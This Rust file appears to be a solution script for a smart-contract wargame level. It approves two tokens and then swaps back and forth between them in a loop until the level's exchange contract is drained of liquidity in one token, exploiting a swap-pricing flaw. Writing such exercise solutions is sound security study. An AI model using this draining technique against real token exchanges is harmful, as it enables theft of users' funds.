use crate::types::*;
use crate::utils;
use ethers::prelude::*;
use std::error::Error;
use std::sync::Arc;

abigen!(
    LevelContract,
    r#"[
        function token1() public returns (address)
        function token2() public returns (address)
        function swap(address, address, uint) public
        function balanceOf(address, address) public view returns (uint)
    ]"#,
);

abigen!(
    TokenContract,
    r#"[
        function approve(address, uint256) public virtual returns (bool)
    ]"#,
);

pub async fn solve(level: &Level, config: &EnvironmentConfig) -> Result<(), Box<dyn Error>> {
    let client = Arc::new(utils::create_signer_middleware(
        config.wallet_mnemonic_path.clone(),
        config.network.chain_id,
        config.network.rpc.clone(),
    )?);

    let level_address = level.instance.parse::<Address>()?;
    let level_contract = LevelContract::new(level_address, client.clone());
    let token1_address = level_contract.token_1().legacy().call().await?;
    let token2_address = level_contract.token_2().legacy().call().await?;
    println!("token1 address: {}", token1_address);
    println!("token2 address: {}", token2_address);

    println!("approving token1");
    let token1_contract = TokenContract::new(token1_address, client.clone());
    let receipt = token1_contract
        .approve(level_address, U256::from_dec_str("1000")?)
        .legacy()
        .send()
        .await?
        .await?;
    println!(
        "token1 approve:\n{}",
        serde_json::to_string_pretty(&receipt)?
    );
    println!("approving token2");
    let token2_contract = TokenContract::new(token2_address, client.clone());
    let receipt = token2_contract
        .approve(level_address, U256::from_dec_str("1000")?)
        .legacy()
        .send()
        .await?
        .await?;
    println!(
        "token2 approve:\n{}",
        serde_json::to_string_pretty(&receipt)?
    );

    let mut token1_balance;
    let mut token2_balance;
    let mut token1_liquidity = level_contract
        .balance_of(token1_address, level_address)
        .legacy()
        .call()
        .await?;
    let mut token2_liquidity = level_contract
        .balance_of(token2_address, level_address)
        .legacy()
        .call()
        .await?;
    while token1_liquidity > U256::zero() && token2_liquidity > U256::zero() {
        token1_balance = level_contract
            .balance_of(token1_address, client.default_sender().unwrap())
            .legacy()
            .call()
            .await?;
        token2_balance = level_contract
            .balance_of(token2_address, client.default_sender().unwrap())
            .legacy()
            .call()
            .await?;
        if token1_balance > U256::zero() {
            level_contract
                .swap(
                    token1_address,
                    token2_address,
                    token1_balance.min(token1_liquidity),
                )
                .legacy()
                .send()
                .await?
                .await?;
        } else {
            level_contract
                .swap(
                    token2_address,
                    token1_address,
                    token2_balance.min(token2_liquidity),
                )
                .legacy()
                .send()
                .await?
                .await?;
        }
        token1_liquidity = level_contract
            .balance_of(token1_address, level_address)
            .legacy()
            .call()
            .await?;
        token2_liquidity = level_contract
            .balance_of(token2_address, level_address)
            .legacy()
            .call()
            .await?;
        println!("TOKEN1 liquidity: {}", token1_liquidity);
        println!("TOKEN2 liquidity: {}\n", token2_liquidity);
    }

    Ok(())
}
